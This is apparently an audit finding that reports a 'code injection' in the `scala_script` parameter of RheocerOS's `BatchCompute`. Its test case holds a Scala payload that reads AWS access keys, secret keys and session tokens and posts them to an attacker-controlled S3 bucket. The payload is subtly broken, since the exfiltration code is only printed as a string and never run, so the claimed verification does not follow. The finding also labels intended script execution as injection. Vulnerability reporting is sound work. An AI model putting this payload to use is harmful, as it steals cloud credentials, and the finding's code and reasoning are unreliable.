### Vulnerability 1: Code Injection in BatchCompute scala_script

- **Description:**
    1. A threat actor can inject malicious Scala code into the `scala_script` parameter of a `BatchCompute` definition within a RheocerOS application.
    2. When the RheocerOS application is activated and a workflow containing this `BatchCompute` node is executed, the injected Scala code is passed to the AWS Glue or EMR environment for execution.
    3. The injected code is then executed with the privileges of the IAM role assumed by the RheocerOS application in the user's AWS account.

- **Impact:**
    - **Critical:** If successfully exploited, this vulnerability allows arbitrary code execution within the user's AWS environment with the permissions of the assumed IAM role. This could lead to:
        - Data exfiltration or modification in S3 or other AWS services accessible by the IAM role.
        - Unauthorized access to and control over AWS resources.
        - Denial of Service by consuming resources or disrupting services.
        - Lateral movement to other systems within the AWS environment if the IAM role has sufficient permissions.

- **Vulnerability Rank:** Critical

- **Currently Implemented Mitigations:**
    - None. The code directly takes the `scala_script` string and executes it in the Glue/EMR environment without any sanitization or validation.

- **Missing Mitigations:**
    - **Input Sanitization and Validation:** Implement strict input validation and sanitization for the `scala_script` parameter to prevent injection of malicious code. Consider using a secure code editor or a limited DSL (Domain Specific Language) for Scala scripting if full Scala script execution is not necessary.
    - **Principle of Least Privilege:** Ensure that the IAM role assumed by RheocerOS applications has the minimum necessary permissions to perform its intended tasks. Avoid granting overly permissive roles like `AdministratorAccess`.
    - **Code Review and Security Audits:** Conduct thorough code reviews and security audits to identify and eliminate potential injection vulnerabilities.
    - **Sandboxing or Isolation:** Explore sandboxing or isolation techniques to limit the impact of potentially malicious code executed within `BatchCompute` nodes.

- **Preconditions:**
    - An attacker needs to be able to modify the RheocerOS application code, specifically the `scala_script` blocks in `BatchCompute` definitions. This could happen if:
        - The attacker has compromised the development environment where the RheocerOS application code is written.
        - The attacker is an authorized user who is intentionally injecting malicious code.
        - The application code is dynamically generated based on external input without proper sanitization (less likely in this framework based on current files).

- **Source Code Analysis:**
    1. **File: `/code/api/api_ext.py`**
    2. **Class: `BatchCompute`**
    3. **Method: `__init__`**
    4. The `BatchCompute` class in `/code/api_ext.py` takes `scala_script` as a parameter:
    ```python
    class BatchCompute(InternalDataNode.BatchComputeDescriptor):
        def __init__(
            self,
            scala_script: str = None, # <-- Injection point
            python_script: str = None,
            lang: Lang = Lang.PYTHON,
            abi: ABI = ABI.GLUE_EMBEDDED,
            external_library_paths: Sequence[str] = None,
            extra_permissions: List[Permission] = None,
            retry_count: int = 0,
            **kwargs,
        ) -> None:
    ```
    5. The `scala_script` parameter is directly passed to the `BatchCompute` object without any validation.
    6. **File: `/code/README.md`**
    7. The `README.md` shows examples of using `scala_script` in `BatchCompute` definitions:
    ```python
    BatchCompute(
        scala_script("""
            pdex
                .filter(...)
                .select(...)
                .distinct()
                """
            ),
        lang=Lang.SCALA,
        ...
    )
    ```
    8. **File: `/code/doc/user_guide/USER_GUIDE.md`**
    9. The user guide also highlights the usage of `scala_script` blocks in `BatchCompute` examples, reinforcing its intended use and making it a prime target for injection.
    10. **Conclusion:** The code analysis confirms that the `scala_script` parameter in `BatchCompute` is a direct injection point. The framework code does not include any input validation or sanitization for this parameter.

- **Security Test Case:**
    1. **Precondition:**
        - Access to a RheocerOS project code base.
        - An AWS account with permissions to deploy and run RheocerOS applications.
    2. **Vulnerability Injection:**
        - Modify an existing RheocerOS application code or create a new one.
        - In a `BatchCompute` definition, replace the existing `scala_script` with malicious code. For example, to exfiltrate environment variables to an attacker-controlled S3 bucket:
        ```python
        BatchCompute(
            scala_script("""
                import sys.process._
                val command = "aws configure get aws_access_key_id"
                val output = command.!!
                val command2 = "aws configure get aws_secret_access_key"
                val output2 = command2.!!
                val command3 = "aws configure get aws_session_token"
                val output3 = command3.!!
                val malicious_code = s\"\"\"

                    import java.net.URLConnection;
                    import java.io.OutputStreamWriter;
                    import java.nio.charset.StandardCharsets;

                    def sendData(data: String): Unit = {
                        try {
                            val url = new URL("https://attacker-controlled-bucket.s3.amazonaws.com/exfiltrated_data.txt");
                            val connection = url.openConnection().asInstanceOf[URLConnection];
                            connection.setDoOutput(true);
                            val outputStreamWriter = new OutputStreamWriter(connection.getOutputStream(), StandardCharsets.UTF_8);
                            outputStreamWriter.write(data);
                            outputStreamWriter.close();
                            println("Data sent successfully")
                        } catch {
                            case e: Exception => println("Error sending data: " + e.getMessage)
                        }
                    }

                    sendData(s"AWS_ACCESS_KEY_ID:$output\\nAWS_SECRET_ACCESS_KEY:$output2\\nAWS_SESSION_TOKEN:$output3")
                \"\"\"
                malicious_code.linesIterator.foreach(line => println(line))
                """.stripMargin
            ),
            lang=Lang.SCALA,
            ...
        )
        ```
        - Replace `attacker-controlled-bucket` with an S3 bucket you control to capture exfiltrated data.
    3. **Application Activation and Execution:**
        - Activate the modified RheocerOS application.
        - Trigger the workflow containing the `BatchCompute` node with the malicious `scala_script`.
    4. **Verification:**
        - Check the attacker-controlled S3 bucket. If the vulnerability is successfully exploited, a file named `exfiltrated_data.txt` containing the AWS credentials of the IAM role used by the Glue job should be present in the bucket.
        - Examine the CloudWatch logs for the Glue job execution. The output of the injected Scala code, including the attempt to exfiltrate credentials, should be visible in the logs.

This vulnerability allows for critical impact and is not mitigated by the current project code. Missing mitigations include input sanitization, least privilege IAM roles, code review, and sandboxing. The preconditions for exploitation are relatively low, making this a high-priority security concern.
